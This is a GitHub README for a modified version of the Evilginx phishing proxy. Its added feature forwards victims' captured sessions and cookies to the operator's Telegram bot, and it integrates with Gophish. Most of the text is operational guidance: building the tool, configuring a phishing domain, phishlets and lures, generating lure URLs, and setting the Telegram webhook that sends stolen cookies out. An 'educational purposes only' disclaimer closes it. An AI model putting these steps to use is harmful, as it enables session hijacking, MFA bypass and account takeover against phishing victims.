
![eviltelgram](https://github.com/itwizardo/evilginx2telegram/assets/32465924/66b6a8f4-73ff-496e-a2c7-38f5a8ff1c3f)

# Evilginx 3.5.0 - Modified By Itwizardo

This is a modified version of Evilginx 3.5.0 that includes functionality to send
sessions to your Telegram account, including the cookies file.
It also has the new Gophish integration and bug fixes.

---

## Features

- **Telegram Integration**: Send session data and cookies to your Telegram account.
- **Gophish Integration**: New support for Gophish phishing campaigns.
- **Bug Fixes**: Various improvements and bug fixes over the original Evilginx.

---

## Ubuntu Installation

To install Evilginx 3.5.0 - Modified By Itwizardo on Ubuntu, follow these steps:

1. Clone the repository:

    ```bash
    git clone https://github.com/itwizardo/evilginx2telegram.git
    ```

2. Navigate to the cloned directory:

    ```bash
    cd evilginx2telegram
    ```

3. Install dependencies:

    ```bash
    go get
    ```

4. Build the project:

    ```bash
    go build
    ```

5. Make the executable:

    ```bash
    make
    ```

6. Navigate to the build directory:

    ```bash
    cd build
    ```

7. Set permissions for the Evilginx executable:

    ```bash
    chmod +rwx evilginx
    ```

8. Run Evilginx:

    ```bash
    ./evilginx -p ../phishlets/
    ```

---

## Configuration Setup

Before using Evilginx, you need to set up your configuration. Follow these steps:

1. Set the domain:

    ```bash
    config domain example.com
    ```

2. Set the external server IP:

    ```bash
    config ipv4 external <server-ip>
    ```

3. Set the server IP to bind to:

    ```bash
    config ipv4 bind <server-ip>
    ```

4. Configure the phishing lets (phishlets):

    ```bash
    phishlets hostname <phishlet-name> <your-domain.com>
    ```

5. Enable the phishlet:

    ```bash
    phishlets enable <your-phishlet-name>
    ```

6. Create the lure (link) for your phishlet:

    ```bash
    lures create <your-phishlet-name>
    ```

7. List lures:

    ```bash
    lures
    ```

8. Get the URL for the created lure:

    ```bash
    lures get-url <lure-id>
    ```

9. Set the unauthenticated URL (optional):

    ```bash
    config unauth_url https://example.com/unauthenticated
    ```

10. Enable/disable SSL certificate auto-generation:

    ```bash
    config autocert on  # or off
    ```

11. Configure the Telegram webhook:

    ```bash
    config webhook_telegram <your-telegram-token>/<your-chat-id>
    ```

    Replace `<your-telegram-token>` with the token provided by BotFather and `<your-chat-id>` with your chat ID (explained below).

---

## Setting Up Telegram

To receive session data (including cookies) on your Telegram, you need to set up a Telegram bot and get your chat ID.

### How to Get Your Chat ID:

1. Open Telegram and search for `@raw_data_bot`.
2. Start a conversation with the bot.
3. The bot will send you your chat ID.

### How to Get Your Telegram Token:

1. Open Telegram and search for `@BotFather`.
2. Start a conversation with `@BotFather` by sending `/start`.
3. Follow the instructions to create a new bot and receive your bot's token.

---

## Important Notes

- **Security**: Ensure that you're using this tool in a controlled and legal environment. Do not use this tool for illegal activities.
- **Educational Use**: This tool is intended for cybersecurity learning and testing purposes only. The creators are not responsible for any misuse.
- **Dependencies**: This tool requires Go and the necessary libraries to run. Ensure that you have the correct environment set up.

---

### License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

**For Educational Purposes Only:**

Evilginx 3.5.0 - Modified By Itwizardo is intended for educational purposes only. Any use of this tool for malicious or illegal activities is strictly prohibited. The developers and contributors are not responsible for any misuse of this tool.
